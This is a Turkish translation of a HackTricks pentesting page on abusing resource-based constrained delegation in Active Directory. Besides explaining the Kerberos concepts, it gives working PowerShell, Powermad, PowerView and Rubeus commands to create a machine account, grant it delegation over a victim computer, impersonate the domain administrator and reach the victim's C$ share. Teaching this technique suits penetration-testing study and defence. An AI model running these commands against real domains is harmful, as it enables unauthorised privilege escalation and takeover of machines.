# Kaynak Tabanlı Kısıtlanmış Delegasyon

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**]'ni edinin (https://peass.creator-spring.com)
* [**PEASS Ailesi**]'ni keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'ler**]'imiz koleksiyonunu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Kaynak Tabanlı Kısıtlanmış Delegasyonun Temelleri

Bu, temel [Kısıtlanmış Delegasyon](constrained-delegation.md) ile benzerdir ancak **bir nesneye herhangi bir kullanıcıyı temsil etme izni vermek yerine** nesne üzerinde **herhangi bir kullanıcıyı temsil etme yeteneğine sahip olan kullanıcıları belirler**.

Bu durumda, kısıtlanmış nesne, herhangi bir kullanıcıyı temsil etme yeteneğine sahip olan kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adında bir özelliğe sahip olacaktır.

Bu Kısıtlanmış Delegasyon ile diğer delegasyonlar arasındaki önemli farklardan biri, herhangi bir kullanıcının **makine hesabı üzerinde yazma izinlerine** sahip olması durumunda _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özelliğini ayarlayabilmesidir (Diğer Delegasyon biçimlerinde etki alanı yöneticisi ayrıcalıklarına ihtiyaç duyulurdu).

### Yeni Kavramlar

Kısıtlanmış Delegasyonda **`TrustedToAuthForDelegation`** bayrağının kullanıcının _userAccountControl_ değeri içinde olması gerektiği **S4U2Self** gerçekleştirmek için gereklidir denilmişti. Ancak bu tamamen doğru değil.\
Gerçek şu ki, bu değere sahip olmasanız bile, bir **hizmet** (SPN'ye sahip olan) olarak herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz ancak, **`TrustedToAuthForDelegation`**'a sahipseniz dönen TGS **Forwardable** olacaktır ve bu bayrağa sahip değilseniz dönen TGS **Forwardable** olmayacaktır.

Ancak, **S4U2Proxy** içinde kullanılan **TGS** **Forwardable** değilse, temel Kısıtlanmış Delegasyonu kötüye kullanmaya çalışmak işe yaramaz. Ancak **Kaynak Tabanlı kısıtlanmış delegasyonu** sömürmeye çalışıyorsanız, işe yarayacaktır (bu bir zayıflık değil, görünüşe göre bir özelliktir).

### Saldırı yapısı

> Eğer bir **Bilgisayar** hesabı üzerinde **yazma eşdeğer ayrıcalıklarınız** varsa, o makinede **özel erişim** elde edebilirsiniz.

Saldırganın zaten **kurban bilgisayar üzerinde yazma eşdeğer ayrıcalıkları** olduğunu varsayalım.

1. Saldırgan, bir **SPN'ye sahip bir hesabı ele geçirir** veya bir tane **oluşturur** ("Hizmet A"). Herhangi bir _Yönetici Kullanıcısı_ herhangi bir diğer özel ayrıcalığa sahip olmadan **10'a kadar Bilgisayar nesnesi** oluşturabilir ve bunlara bir SPN atayabilir. Bu nedenle saldırgan sadece bir Bilgisayar nesnesi oluşturabilir ve bir SPN atayabilir.
2. Saldırgan, **kurban bilgisayar üzerindeki YAZMA ayrıcalığını kötüye kullanarak** kaynak tabanlı kısıtlanmış delegasyonu yapılandırır ve bu sayede Hizmet A'nın o kurban bilgisayar (Hizmet B) karşısında herhangi bir kullanıcıyı temsil etmesine izin verir.
3. Saldırgan, Rubeus'u kullanarak bir kullanıcının **özel erişime sahip olduğu** bir kullanıcı için Hizmet A'dan Hizmet B'ye **tam bir S4U saldırısı** gerçekleştirir (S4U2Self ve S4U2Proxy).
1. S4U2Self (ele geçirilen/oluşturulan SPN hesabından): **Yönetici için bana bir TGS** iste (Forwardable değil).
2. S4U2Proxy: Önceki adımda kullanılan **Forwardable olmayan TGS**'yi kullanarak **Yönetici**'den **kurban ana bilgisayarına bir TGS** iste.
3. Forwardable olmayan bir TGS kullanıyor olsanız da, kaynak tabanlı kısıtlanmış delegasyonu sömürdüğünüzden işe yarayacaktır.
4. Saldırgan **bilet aktarımı** yapabilir ve kullanıcıyı **temsil edebilir** ve **kurban Hizmet B'ye erişim** elde edebilir.

Alanın _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bir Bilgisayar Nesnesi Oluşturma

Etki alanı içinde bir bilgisayar nesnesi oluşturabilirsiniz [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Kısıtlanmış Delegasyon** yapılandırma

**activedirectory PowerShell modülünü kullanma**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Powerview kullanarak**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U saldırısı gerçekleştirme

İlk olarak, `123456` şifresiyle yeni Bilgisayar nesnesini oluşturduk, bu yüzden o şifrenin hash'ine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, hesap için RC4 ve AES karmaşalarını yazdıracaktır.\
Şimdi, saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak sadece bir kez sorarak daha fazla bilet oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Kullanıcıların "**Delegasyon yapılamaz**" adında bir özelliği olduğunu unutmayın. Bir kullanıcının bu özelliği True olarak ayarlanmışsa, onun yerine geçemezsiniz. Bu özellik BloodHound içinde görülebilir.
{% endhint %}

### Erişim

Son komut satırı **tam S4U saldırısını gerçekleştirecek ve Yönetici'den kurban ana bilgisayarına TGS enjekte edecektir**.\
Bu örnekte, Yönetici için bir TGS istendi, böylece **C$**'ye erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı hizmet biletlerini kötüye kullanma

[**Mevcut hizmet biletlerini buradan öğrenin**](silver-ticket.md#available-services).

## Kerberos Hataları

* **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4'ü kullanmamak için yapılandırıldığı anlamına gelir ve siz sadece RC4 hash'ini sağlıyorsunuz. Rubeus'a en az AES256 hash'ini (veya sadece rc4, aes128 ve aes256 hash'lerini) sağlayın. Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saati ile DC'nin saatinin farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
* **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin giriş yapmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Bu şunları ifade edebilir:
  * Taklit etmeye çalıştığınız kullanıcının istenilen hizmete erişimi olmayabilir (çünkü taklit edemezsiniz veya yeterli ayrıcalığa sahip değildir)
  * İstenen hizmet mevcut değil (örneğin winrm için bir bilet istiyorsanız ancak winrm çalışmıyorsa)
  * Oluşturulan fakecomputer, zayıf sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve geri vermeniz gerekebilir.

## Referanslar

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme hakkında bilgi edinin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.**

</details>
